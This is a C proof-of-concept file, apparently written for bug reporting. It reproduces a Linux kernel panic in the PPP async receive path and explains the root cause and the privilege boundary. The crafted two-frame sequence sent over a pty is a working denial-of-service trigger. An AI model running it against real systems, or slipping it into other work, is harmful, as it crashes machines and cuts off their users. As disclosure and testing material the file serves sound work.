/*
 * Minimal reproducer: skb_under_panic in ppp_receive_nonmp_frame().
 *
 *   skbuff: skb_under_panic: len:N put:2 head:X data:X-1 ...
 *   kernel BUG at net/core/skbuff.c:214!
 *     skb_push+0xbd
 *     ppp_receive_nonmp_frame+0x48a   (drivers/net/ppp/ppp_generic.c:2506)
 *     ppp_input
 *     ppp_async_process               (softirq)
 *
 * THE BUG
 * -------
 * Two things in drivers/net/ppp/ppp_async.c combine.
 *
 * 1. The frame-error path resets a reused skb's headroom to zero, with a
 *    comment claiming it is equivalent to a fresh allocation -- it is not, as
 *    dev_alloc_skb() leaves NET_SKB_PAD:
 *
 *        err:                                              // ppp_async.c:812
 *              if (skb) {
 *                      // make skb appear as freshly allocated
 *                      skb_trim(skb, 0);
 *                      skb_reserve(skb, - skb_headroom(skb));
 *              }
 *
 *    ap->rpkt keeps pointing at that skb, so the *next* frame reuses it with
 *    zero headroom.
 *
 * 2. The headroom for a new frame is guessed from a single byte, and the
 *    comment admits the guess is incomplete:
 *
 *        if (skb->len == 0) {                              // ppp_async.c:876
 *                // Try to get the payload 4-byte aligned. This should match
 *                // the PPP_ALLSTATIONS/PPP_UI/compressed tests in
 *                // process_input_packet, but we do not have enough chars
 *                // here to test buf[1] and buf[2].
 *                if (buf[0] != PPP_ALLSTATIONS)
 *                        skb_reserve(skb, 2 + (buf[0] & 1));
 *        }
 *
 *    When the frame starts with 0xff, nothing is reserved at all.
 *
 * So: a frame with a bad FCS zeroes the reused skb's headroom, the next frame
 * starts 0xff 0x03 so no headroom is reserved, process_input_packet() pulls
 * the 2-byte address/control (headroom 2), __ppp_decompress_proto() pushes 1
 * back for the PFC-compressed protocol byte (headroom 1), and then
 * ppp_receive_nonmp_frame() pushes 2 more for PPP_FILTER_INBOUND_TAG:
 *
 *        *(__be16 *)skb_push(skb, 2) = htons(PPP_FILTER_INBOUND_TAG);
 *
 *    -- one byte below skb->head. BUG().
 *
 * That last push only happens when a pass or active filter is installed, so
 * CONFIG_PPP_FILTER must be on and the link must have had PPPIOCSPASS or
 * PPPIOCSACTIVE applied -- which is what pppd does for demand-dialling and
 * for `active-filter`.
 *
 * BOUNDARY: setting the filter and creating the unit needs root (/dev/ppp is
 * 0600). The frames that trigger it come from the *tty* side, i.e. from the
 * peer on a real link. So this is not local privilege escalation; it is a
 * remote panic on a PPP link that has filters configured.
 *
 * Build: gcc -O1 -static -o repro-ppp-skb repro-ppp-skb.c
 * Run as root in a disposable VM. Panics within milliseconds.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <termios.h>

#define N_PPP 3

struct sock_filter_ { uint16_t code; uint8_t jt, jf; uint32_t k; };
struct sock_fprog_  { unsigned short len; struct sock_filter_ *filter; };

#define PPPIOCSFLAGS    _IOW('t', 89, int)
#define PPPIOCSPASS    _IOW('t', 71, struct sock_fprog_)
#define PPPIOCNEWUNIT    _IOWR('t', 62, int)
#define PPPIOCCONNECT    _IOW('t', 58, int)
#define PPPIOCATTCHAN    _IOW('t', 56, int)
#define PPPIOCGCHAN    _IOR('t', 55, int)

#define SC_CCP_OPEN    0x00000040
#define SC_ENABLE_IP    0x00000100

static uint16_t fcs16(uint16_t fcs, const uint8_t *p, int n)
{
    int i;

    while (n-- > 0) {
        fcs ^= *p++;
        for (i = 0; i < 8; i++)
            fcs = (uint16_t)((fcs >> 1) ^ ((fcs & 1) ? 0x8408 : 0));
    }
    return fcs;
}

/* Wrap `body` (already including address/control/protocol) as an AHDLC frame. */
static int frame(uint8_t *out, int outsz, const uint8_t *body, int bl,
         int good_fcs)
{
    uint8_t buf[4096];
    uint16_t fcs;
    int n = 0, i;

    if (bl + 2 > (int)sizeof(buf))
        return -1;
    memcpy(buf, body, bl);
    fcs = (uint16_t)~fcs16(0xffff, buf, bl);
    if (!good_fcs)
        fcs ^= 0xbeef;            /* deliberately wrong */
    buf[bl++] = (uint8_t)fcs;
    buf[bl++] = (uint8_t)(fcs >> 8);

    out[n++] = 0x7e;
    for (i = 0; i < bl && n < outsz - 2; i++) {
        uint8_t c = buf[i];

        if (c == 0x7e || c == 0x7d || c < 0x20) {
            out[n++] = 0x7d;
            out[n++] = c ^ 0x20;
        } else {
            out[n++] = c;
        }
    }
    out[n++] = 0x7e;
    return n;
}

int main(void)
{
    struct sock_filter_ prog[1] = { { 0x06, 0, 0, 0xffff } };   /* BPF: ret 0xffff */
    struct sock_fprog_ fp = { 1, prog };
    uint8_t body[512], out[1200];
    char path[64];
    unsigned int lock = 0;
    int master, slave, ptn, unit_fd, chan_fd;
    int ldisc = N_PPP, chan, unit = -1, flags, n, i;

    master = open("/dev/ptmx", O_RDWR | O_NOCTTY | O_NONBLOCK);
    if (master < 0) { perror("ptmx"); return 1; }
    if (ioctl(master, TIOCSPTLCK, &lock) < 0) { perror("unlockpt"); return 1; }
    if (ioctl(master, TIOCGPTN, &ptn) < 0) { perror("ptn"); return 1; }
    snprintf(path, sizeof(path), "/dev/pts/%d", ptn);
    slave = open(path, O_RDWR | O_NOCTTY | O_NONBLOCK);
    if (slave < 0) { perror("pts"); return 1; }

    /* N_PPP on the slave creates a PPP channel. */
    if (ioctl(slave, TIOCSETD, &ldisc) < 0) { perror("TIOCSETD"); return 1; }
    if (ioctl(slave, PPPIOCGCHAN, &chan) < 0) { perror("GCHAN"); return 1; }

    unit_fd = open("/dev/ppp", O_RDWR);
    if (unit_fd < 0) { perror("/dev/ppp (needs root)"); return 1; }
    if (ioctl(unit_fd, PPPIOCNEWUNIT, &unit) < 0) { perror("NEWUNIT"); return 1; }

    chan_fd = open("/dev/ppp", O_RDWR);
    if (chan_fd < 0) { perror("/dev/ppp 2"); return 1; }
    if (ioctl(chan_fd, PPPIOCATTCHAN, &chan) < 0) { perror("ATTCHAN"); return 1; }
    if (ioctl(chan_fd, PPPIOCCONNECT, &unit) < 0) { perror("CONNECT"); return 1; }

    flags = SC_CCP_OPEN | SC_ENABLE_IP;
    ioctl(unit_fd, PPPIOCSFLAGS, &flags);

    /* The filter is what makes ppp_receive_nonmp_frame() push 2 bytes. */
    if (ioctl(unit_fd, PPPIOCSPASS, &fp) < 0) { perror("PPPIOCSPASS"); return 1; }

    printf("REPRO: unit=%d chan=%d, pass filter installed\n", unit, chan);
    fflush(stdout);

    /*
     * Frame 1: bad FCS. process_input_packet() takes its err: path, which
     * trims the skb and sets its headroom to zero -- and leaves it in
     * ap->rpkt to be reused.
     */
    body[0] = 0xff;
    body[1] = 0x03;
    body[2] = 0x00;
    body[3] = 0x21;            /* PPP_IP, uncompressed */
    for (i = 4; i < 32; i++)
        body[i] = (uint8_t)i;
    n = frame(out, sizeof(out), body, 32, 0 /* bad FCS */);
    if (write(master, out, n) != n) { perror("write 1"); return 1; }
    printf("REPRO: sent frame 1 (bad FCS) -- headroom of the reused skb is now 0\n");
    fflush(stdout);
    usleep(50000);

    /*
     * Frame 2, on the skb frame 1 left behind:
     *   starts 0xff  -> ppp_async_input() reserves nothing
     *   0xff 0x03    -> process_input_packet() pulls 2   (headroom 2)
     *   0x21         -> PFC-compressed PPP_IP, odd, so
     *                   __ppp_decompress_proto() pushes 1 (headroom 1)
     *   PPP_IP maps to a real NP index, so the filter branch runs and
     *   pushes 2 -> one byte below skb->head -> BUG().
     */
    body[0] = 0xff;
    body[1] = 0x03;
    body[2] = 0x21;            /* compressed protocol field, odd */
    body[3] = 0x45;            /* looks like an IPv4 header */
    body[4] = 0x00;
    body[5] = 0x00;
    body[6] = 0x28;
    for (i = 7; i < 48; i++)
        body[i] = (uint8_t)(i * 7);
    n = frame(out, sizeof(out), body, 48, 1 /* good FCS */);
    printf("REPRO: sending frame 2 (ff 03 + PFC PPP_IP) -- expect skb_under_panic\n");
    fflush(stdout);
    if (write(master, out, n) != n) { perror("write 2"); return 1; }

    usleep(200000);
    printf("REPRO: still alive -- did NOT reproduce\n");
    fflush(stdout);
    return 0;
}
